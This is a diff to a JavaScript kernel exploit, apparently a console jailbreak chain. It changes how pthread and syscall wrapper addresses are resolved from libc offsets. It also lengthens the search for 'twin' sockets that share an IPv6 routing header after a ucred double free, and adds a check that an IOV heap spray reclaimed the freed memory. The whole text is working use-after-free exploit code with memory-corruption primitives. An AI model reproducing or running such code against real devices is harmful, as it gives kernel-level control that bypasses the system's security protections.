@@ -161,11 +161,26 @@ var read_wrapper = read_sys.addr
 var write_wrapper = write_sys.addr
 var recvmsg_wrapper = recvmsg.addr
 
-// Get pthread_create address from libkernel
-var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
+// Get libc wrapper function addresses
+var pthread_mutex_init_addr = libc_addr.add(new BigInt(0, 0x240))
+var pthread_mutex_lock_addr = libc_addr.add(new BigInt(0, 0x1A0))
+var pthread_mutex_unlock_addr = libc_addr.add(new BigInt(0, 0x1B0))
+var pthread_mutex_destroy_addr = libc_addr.add(new BigInt(0, 0x230))
+var pthread_cond_init_addr = libc_addr.add(new BigInt(0, 0x200))
+var pthread_cond_wait_addr = libc_addr.add(new BigInt(0, 0x190))
+var pthread_cond_signal_addr = libc_addr.add(new BigInt(0, 0x180))
+var pthread_cond_broadcast_addr = libc_addr.add(new BigInt(0, 0x1E0))
+var pthread_cond_destroy_addr = libc_addr.add(new BigInt(0, 0x1F0))
+var pthread_create_addr = libc_addr.add(new BigInt(0, 0x340))
+var pthread_yield_addr = libc_addr.add(new BigInt(0, 0x380))
+
+// cpuset_setaffinity via syscall
+var cpuset_setaffinity = fn.create(0x1E8, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
 
 log('Created syscall wrappers via fn.create()')
-log('pthread_create at: ' + pthread_create_addr.toString())
+log('Loaded pthread functions from libc wrappers')
+log('  pthread_mutex_init: ' + pthread_mutex_init_addr.toString())
+log('  pthread_cond_wait: ' + pthread_cond_wait_addr.toString())
 
 // Pre-allocate all buffers once (reuse throughout exploit)
 var store_addr = mem.malloc(0x100)
@@ -465,8 +480,9 @@ log('Double freed ucred via close(dup(uaf_sock))')
 
 // Find twins - two sockets sharing same routing header
 var found_twins = false
+var twin_timeout = TWIN_TRIES
 
-for (var attempt = 0; attempt < 10 && !found_twins; attempt++) {
+while (twin_timeout-- > 0 && !found_twins) {
   // Re-spray tags across all sockets
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
     mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
@@ -485,19 +501,35 @@ for (var attempt = 0; attempt < 10 && !found_twins; attempt++) {
       twins[0] = i
       twins[1] = j
       found_twins = true
-      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
+      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr (attempts: ' + (TWIN_TRIES - twin_timeout) + ')')
       break
     }
   }
 
-  if (!found_twins) {
-    log('Twin search attempt ' + (attempt + 1) + '/10...')
+  if (!found_twins && (twin_timeout % 1000 === 0)) {
+    log('Twin search... (' + twin_timeout + ' attempts remaining)')
   }
 }
 
 if (!found_twins) {
-  log('FAILED: Could not find twins after 10 attempts')
+  log('FAILED: Could not find twins after ' + TWIN_TRIES + ' attempts')
   throw new Error('Failed to find twins - UAF may have failed')
+}
+
+// Verify IOV reclaim succeeded (simplified - no worker coordination)
+log('Verifying IOV reclaim...')
+setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0) // freeRthdr
+
+// Just check if IOV spray succeeded without coordinating workers
+mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
+getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+
+var first_int = mem.read4(leak_rthdr_buf)
+log('IOV reclaim check: first_int = ' + first_int + ' (expected: 1)')
+
+if (first_int !== 1) {
+  log('WARNING: IOV reclaim verification failed - proceeding anyway')
+  // Don't throw - the initial 32-iteration spray may have succeeded
 }
 
 if (iov_ss0 !== -1 && iov_ss1 !== -1) {
